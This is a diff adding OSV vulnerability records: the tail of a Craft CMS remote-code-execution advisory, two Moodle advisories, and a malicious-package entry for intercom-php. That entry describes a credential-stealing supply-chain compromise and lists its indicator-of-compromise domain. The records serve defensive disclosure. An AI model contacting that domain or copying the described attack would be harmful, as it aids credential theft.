+          "4.14.4",
+          "4.14.5",
+          "4.14.6",
+          "4.14.7",
+          "4.14.8",
+          "4.14.8.1",
+          "4.14.9",
+          "4.15.0",
+          "4.15.0-beta.1",
+          "4.15.0-beta.2",
+          "4.15.0.1",
+          "4.15.0.2",
+          "4.15.1",
+          "4.15.2",
+          "4.15.3",
+          "4.15.4",
+          "4.15.5",
+          "4.15.6",
+          "4.15.6.1",
+          "4.15.6.2",
+          "4.15.7",
+          "4.16.0",
+          "4.16.1",
+          "4.16.10",
+          "4.16.11",
+          "4.16.12",
+          "4.16.13",
+          "4.16.14",
+          "4.16.15",
+          "4.16.16",
+          "4.16.17",
+          "4.16.18",
+          "4.16.19",
+          "4.16.2",
+          "4.16.3",
+          "4.16.4",
+          "4.16.5",
+          "4.16.6",
+          "4.16.6.1",
+          "4.16.7",
+          "4.16.8",
+          "4.16.9",
+          "4.16.9.1",
+          "4.17.0",
+          "4.17.0-beta.1",
+          "4.17.0-beta.2",
+          "4.17.1",
+          "4.17.10",
+          "4.17.11",
+          "4.17.12",
+          "4.17.13",
+          "4.17.13.1",
+          "4.17.14",
+          "4.17.15",
+          "4.17.16",
+          "4.17.2",
+          "4.17.3",
+          "4.17.4",
+          "4.17.5",
+          "4.17.6",
+          "4.17.7",
+          "4.17.8",
+          "4.17.9",
+          "4.18.0",
+          "4.18.0.1",
+          "4.18.1",
+          "4.2.0",
+          "4.2.0.1",
+          "4.2.0.2",
+          "4.2.1",
+          "4.2.1.1",
+          "4.2.2",
+          "4.2.3",
+          "4.2.4",
+          "4.2.5",
+          "4.2.5.1",
+          "4.2.5.2",
+          "4.2.6",
+          "4.2.7",
+          "4.2.8",
+          "4.3.0",
+          "4.3.1",
+          "4.3.10",
+          "4.3.11",
+          "4.3.2",
+          "4.3.2.1",
+          "4.3.3",
+          "4.3.4",
+          "4.3.5",
+          "4.3.6",
+          "4.3.6.1",
+          "4.3.7",
+          "4.3.7.1",
+          "4.3.8",
+          "4.3.8.1",
+          "4.3.8.2",
+          "4.3.9",
+          "4.4.0",
+          "4.4.0-beta.1",
+          "4.4.0-beta.2",
+          "4.4.0-beta.3",
+          "4.4.0-beta.4",
+          "4.4.0-beta.5",
+          "4.4.0-beta.6",
+          "4.4.0-beta.7",
+          "4.4.1",
+          "4.4.10",
+          "4.4.10.1",
+          "4.4.11",
+          "4.4.12",
+          "4.4.13",
+          "4.4.14",
+          "4.4.15",
+          "4.4.16",
+          "4.4.16.1",
+          "4.4.17",
+          "4.4.2",
+          "4.4.3",
+          "4.4.4",
+          "4.4.5",
+          "4.4.6",
+          "4.4.6.1",
+          "4.4.7",
+          "4.4.7.1",
+          "4.4.8",
+          "4.4.9",
+          "4.5.0",
+          "4.5.0-beta.1",
+          "4.5.0-beta.2",
+          "4.5.1",
+          "4.5.10",
+          "4.5.11",
+          "4.5.11.1",
+          "4.5.12",
+          "4.5.13",
+          "4.5.14",
+          "4.5.15",
+          "4.5.2",
+          "4.5.3",
+          "4.5.4",
+          "4.5.5",
+          "4.5.6",
+          "4.5.6.1",
+          "4.5.7",
+          "4.5.8",
+          "4.5.9",
+          "4.6.0",
+          "4.6.0-RC1",
+          "4.6.1",
+          "4.7.0",
+          "4.7.1",
+          "4.7.2",
+          "4.7.2.1",
+          "4.7.3",
+          "4.7.4",
+          "4.8.0",
+          "4.8.1",
+          "4.8.10",
+          "4.8.11",
+          "4.8.2",
+          "4.8.3",
+          "4.8.4",
+          "4.8.5",
+          "4.8.6",
+          "4.8.7",
+          "4.8.8",
+          "4.8.9",
+          "4.9.0",
+          "4.9.1",
+          "4.9.2",
+          "4.9.3",
+          "4.9.4",
+          "4.9.5",
+          "4.9.6",
+          "4.9.7"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-265m-7826-wjqm/GHSA-265m-7826-wjqm.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/craftcms/cms/security/advisories/GHSA-265m-7826-wjqm"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-72778"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/craftcms/cms/commit/353b5d676c88a854c9f6409ad83b837ca0c0e8da"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/craftcms/cms/commit/789789dc9e2a4e2f2562f51aaf879fb7757d8340"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/craftcms/cms"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/craftcms/cms/releases/tag/4.18.2"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/craftcms/cms/releases/tag/5.10.6"
+      },
+      {
+        "type": "WEB",
+        "url": "https://www.vulncheck.com/advisories/craft-cms-rc1-before-authenticated-rce-via-condition-config"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-915"
+      ],
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-08-06T20:45:00Z",
+      "nvd_published_at": null,
+      "severity": "HIGH"
+    },
+    "severity": [
+      {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-267j-cwvg-j28c",
+    "published": "2022-05-13T01:12:51Z",
+    "modified": "2024-12-07T05:42:58.319375Z",
+    "aliases": [
+      "CVE-2014-2572"
+    ],
+    "summary": "Moodle attackers to modify grade metadata",
+    "details": "mod/assign/externallib.php in Moodle 2.6.x before 2.6.2 does not properly handle assignment web-service parameters, which might allow remote authenticated users to modify grade metadata via unspecified vectors.",
+    "affected": [
+      {
+        "package": {
+          "name": "moodle/moodle",
+          "ecosystem": "Packagist",
+          "purl": "pkg:composer/moodle/moodle"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "2.6.0"
+              },
+              {
+                "fixed": "2.6.2"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "v2.6.0",
+          "v2.6.1"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-267j-cwvg-j28c/GHSA-267j-cwvg-j28c.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2014-2572"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/moodle/moodle/commit/695a18b6aa9661f812a1a745a888df5acdbd7bc6"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/moodle/moodle/commit/f96b8a1c67f4a106fb7fa78b4338f3c35973f1da"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/moodle/moodle"
+      },
+      {
+        "type": "WEB",
+        "url": "https://moodle.org/mod/forum/discuss.php?d=256425"
+      },
+      {
+        "type": "WEB",
+        "url": "http://git.moodle.org/gw?p=moodle.git&a=search&h=HEAD&st=commit&s=MDL-43468"
+      },
+      {
+        "type": "WEB",
+        "url": "http://openwall.com/lists/oss-security/2014/03/17/1"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [],
+      "github_reviewed": true,
+      "github_reviewed_at": "2024-01-24T21:16:30Z",
+      "nvd_published_at": "2014-03-24T14:20:00Z",
+      "severity": "MODERATE"
+    }
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-273w-7fxj-pcp6",
+    "published": "2023-03-06T21:30:18Z",
+    "modified": "2025-03-07T21:46:38.433403Z",
+    "aliases": [
+      "BIT-moodle-2021-36395",
+      "CVE-2021-36395"
+    ],
+    "summary": "Moodle vulnerable to Uncontrolled Resource Consumption",
+    "details": "In Moodle, the file repository's URL parsing required additional recursion handling to mitigate the risk of recursion denial of service.",
+    "affected": [
+      {
+        "package": {
+          "name": "moodle/moodle",
+          "ecosystem": "Packagist",
+          "purl": "pkg:composer/moodle/moodle"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "3.11.0-beta"
+              },
+              {
+                "fixed": "3.11.1"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "v3.11.0",
+          "v3.11.0-beta",
+          "v3.11.0-rc1",
+          "v3.11.0-rc2"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/03/GHSA-273w-7fxj-pcp6/GHSA-273w-7fxj-pcp6.json"
+        }
+      },
+      {
+        "package": {
+          "name": "moodle/moodle",
+          "ecosystem": "Packagist",
+          "purl": "pkg:composer/moodle/moodle"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "3.10.0-beta"
+              },
+              {
+                "fixed": "3.10.5"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "v3.10.0",
+          "v3.10.0-beta",
+          "v3.10.0-rc1",
+          "v3.10.0-rc2",
+          "v3.10.1",
+          "v3.10.2",
+          "v3.10.3",
+          "v3.10.4"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/03/GHSA-273w-7fxj-pcp6/GHSA-273w-7fxj-pcp6.json"
+        }
+      },
+      {
+        "package": {
+          "name": "moodle/moodle",
+          "ecosystem": "Packagist",
+          "purl": "pkg:composer/moodle/moodle"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "3.9.8"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "v2.3.10",
+          "v2.3.11",
+          "v2.3.4",
+          "v2.3.5",
+          "v2.3.6",
+          "v2.3.7",
+          "v2.3.8",
+          "v2.3.9",
+          "v2.4.0",
+          "v2.4.0-rc1",
+          "v2.4.1",
+          "v2.4.10",
+          "v2.4.11",
+          "v2.4.2",
+          "v2.4.3",
+          "v2.4.4",
+          "v2.4.5",
+          "v2.4.6",
+          "v2.4.7",
+          "v2.4.8",
+          "v2.4.9",
+          "v2.5.0",
+          "v2.5.0-beta",
+          "v2.5.0-rc1",
+          "v2.5.1",
+          "v2.5.2",
+          "v2.5.3",
+          "v2.5.4",
+          "v2.5.5",
+          "v2.5.6",
+          "v2.5.7",
+          "v2.5.8",
+          "v2.5.9",
+          "v2.6.0",
+          "v2.6.0-beta",
+          "v2.6.0-rc1",
+          "v2.6.1",
+          "v2.6.10",
+          "v2.6.11",
+          "v2.6.2",
+          "v2.6.3",
+          "v2.6.4",
+          "v2.6.5",
+          "v2.6.6",
+          "v2.6.7",
+          "v2.6.8",
+          "v2.6.9",
+          "v2.7.0",
+          "v2.7.0-beta",
+          "v2.7.0-rc1",
+          "v2.7.0-rc2",
+          "v2.7.1",
+          "v2.7.10",
+          "v2.7.11",
+          "v2.7.12",
+          "v2.7.13",
+          "v2.7.14",
+          "v2.7.15",
+          "v2.7.16",
+          "v2.7.17",
+          "v2.7.18",
+          "v2.7.19",
+          "v2.7.2",
+          "v2.7.20",
+          "v2.7.3",
+          "v2.7.4",
+          "v2.7.5",
+          "v2.7.6",
+          "v2.7.7",
+          "v2.7.8",
+          "v2.7.9",
+          "v2.8.0",
+          "v2.8.0-beta",
+          "v2.8.0-rc1",
+          "v2.8.0-rc2",
+          "v2.8.1",
+          "v2.8.10",
+          "v2.8.11",
+          "v2.8.12",
+          "v2.8.2",
+          "v2.8.3",
+          "v2.8.4",
+          "v2.8.5",
+          "v2.8.6",
+          "v2.8.7",
+          "v2.8.8",
+          "v2.8.9",
+          "v2.9.0",
+          "v2.9.0-beta",
+          "v2.9.0-rc1",
+          "v2.9.0-rc2",
+          "v2.9.1",
+          "v2.9.2",
+          "v2.9.3",
+          "v2.9.4",
+          "v2.9.5",
+          "v2.9.6",
+          "v2.9.7",
+          "v2.9.8",
+          "v2.9.9",
+          "v3.0.0",
+          "v3.0.0-beta",
+          "v3.0.0-rc1",
+          "v3.0.0-rc2",
+          "v3.0.0-rc3",
+          "v3.0.0-rc4",
+          "v3.0.1",
+          "v3.0.10",
+          "v3.0.2",
+          "v3.0.3",
+          "v3.0.4",
+          "v3.0.5",
+          "v3.0.6",
+          "v3.0.7",
+          "v3.0.8",
+          "v3.0.9",
+          "v3.1.0",
+          "v3.1.0-beta",
+          "v3.1.0-rc1",
+          "v3.1.0-rc2",
+          "v3.1.1",
+          "v3.1.10",
+          "v3.1.11",
+          "v3.1.12",
+          "v3.1.13",
+          "v3.1.14",
+          "v3.1.15",
+          "v3.1.16",
+          "v3.1.17",
+          "v3.1.18",
+          "v3.1.2",
+          "v3.1.3",
+          "v3.1.4",
+          "v3.1.5",
+          "v3.1.6",
+          "v3.1.7",
+          "v3.1.8",
+          "v3.1.9",
+          "v3.2.0",
+          "v3.2.0-beta",
+          "v3.2.0-rc1",
+          "v3.2.0-rc2",
+          "v3.2.0-rc3",
+          "v3.2.0-rc4",
+          "v3.2.0-rc5",
+          "v3.2.1",
+          "v3.2.2",
+          "v3.2.3",
+          "v3.2.4",
+          "v3.2.5",
+          "v3.2.6",
+          "v3.2.7",
+          "v3.2.8",
+          "v3.2.9",
+          "v3.3.0",
+          "v3.3.0-beta",
+          "v3.3.0-rc1",
+          "v3.3.0-rc2",
+          "v3.3.0-rc3",
+          "v3.3.1",
+          "v3.3.2",
+          "v3.3.3",
+          "v3.3.4",
+          "v3.3.5",
+          "v3.3.6",
+          "v3.3.7",
+          "v3.3.8",
+          "v3.3.9",
+          "v3.4.0",
+          "v3.4.0-beta",
+          "v3.4.0-rc1",
+          "v3.4.0-rc2",
+          "v3.4.0-rc3",
+          "v3.4.1",
+          "v3.4.2",
+          "v3.4.3",
+          "v3.4.4",
+          "v3.4.5",
+          "v3.4.6",
+          "v3.4.7",
+          "v3.4.8",
+          "v3.4.9",
+          "v3.5.0",
+          "v3.5.0-beta",
+          "v3.5.0-rc1",
+          "v3.5.1",
+          "v3.5.10",
+          "v3.5.11",
+          "v3.5.12",
+          "v3.5.13",
+          "v3.5.14",
+          "v3.5.15",
+          "v3.5.16",
+          "v3.5.17",
+          "v3.5.18",
+          "v3.5.2",
+          "v3.5.3",
+          "v3.5.4",
+          "v3.5.5",
+          "v3.5.6",
+          "v3.5.7",
+          "v3.5.8",
+          "v3.5.9",
+          "v3.6.0",
+          "v3.6.0-beta",
+          "v3.6.0-rc1",
+          "v3.6.0-rc2",
+          "v3.6.0-rc3",
+          "v3.6.1",
+          "v3.6.10",
+          "v3.6.2",
+          "v3.6.3",
+          "v3.6.4",
+          "v3.6.5",
+          "v3.6.6",
+          "v3.6.7",
+          "v3.6.8",
+          "v3.6.9",
+          "v3.7.0",
+          "v3.7.0-beta",
+          "v3.7.0-rc1",
+          "v3.7.0-rc2",
+          "v3.7.1",
+          "v3.7.2",
+          "v3.7.3",
+          "v3.7.4",
+          "v3.7.5",
+          "v3.7.6",
+          "v3.7.7",
+          "v3.7.8",
+          "v3.7.9",
+          "v3.8.0",
+          "v3.8.0-beta",
+          "v3.8.0-rc1",
+          "v3.8.1",
+          "v3.8.2",
+          "v3.8.3",
+          "v3.8.4",
+          "v3.8.5",
+          "v3.8.6",
+          "v3.8.7",
+          "v3.8.8",
+          "v3.8.9",
+          "v3.9.0",
+          "v3.9.0-beta",
+          "v3.9.0-rc1",
+          "v3.9.0-rc2",
+          "v3.9.0-rc3",
+          "v3.9.1",
+          "v3.9.2",
+          "v3.9.3",
+          "v3.9.4",
+          "v3.9.5",
+          "v3.9.6",
+          "v3.9.7"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/03/GHSA-273w-7fxj-pcp6/GHSA-273w-7fxj-pcp6.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-36395"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/moodle/moodle"
+      },
+      {
+        "type": "WEB",
+        "url": "https://moodle.org/mod/forum/discuss.php?d=424801"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-400",
+        "CWE-674"
+      ],
+      "github_reviewed": true,
+      "github_reviewed_at": "2023-03-07T20:57:09Z",
+      "nvd_published_at": "2023-03-06T21:15:00Z",
+      "severity": "HIGH"
+    },
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "MAL-2026-3637",
+    "published": "2026-05-13T03:14:00Z",
+    "modified": "2026-08-19T06:15:08.711627464Z",
+    "summary": "Malicious code in intercom-php (Packagist)",
+    "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: google-open-source-security (0bd33abd6fda35e856f8346fda5e85913ce2cad6b4d6c315a2e7138b867760aa)\nThis package is malicious and was compromised as part of the Mini Shai-Hulud campaign by the TeamPCP threat actor.\nThe malicious payload steals credentials, and can propogate to NPM packages using credentials it finds.\n",
+    "affected": [
+      {
+        "package": {
+          "name": "intercom/intercom-php",
+          "ecosystem": "Packagist",
+          "purl": "pkg:composer/intercom/intercom-php"
+        },
+        "versions": [
+          "5.0.2"
+        ],
+        "database_specific": {
+          "source": "https://github.com/ossf/malicious-packages/blob/main/osv/malicious/packagist/intercom/intercom-php/MAL-2026-3637.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "ARTICLE",
+        "url": "https://socket.dev/blog/mini-shai-hulud-packagist-malicious-intercom-php-package-compromise"
+      },
+      {
+        "type": "ARTICLE",
+        "url": "https://semgrep.dev/blog/2026/malicious-intercom-php-package-spreads-mini-shai-hulud-attack-to-packagist-via-composer-plugin/"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://github.com/advisories/GHSA-gr3r-crp5-qrrm"
+      }
+    ],
+    "database_specific": {
+      "iocs": {
+        "domains": [
+          "zero.masscan.cloud"
+        ]
+      },
+      "malicious-packages-origins": [
+        {
+          "import_time": "2026-05-13T03:26:12.284906Z",
+          "modified_time": "2026-05-13T03:14:00Z",
+          "sha256": "0bd33abd6fda35e856f8346fda5e85913ce2cad6b4d6c315a2e7138b867760aa",
+          "source": "google-open-source-security",
+          "versions": [
+            "5.0.2"
+          ]
+        }
+      ]
+    }
+  }
+]
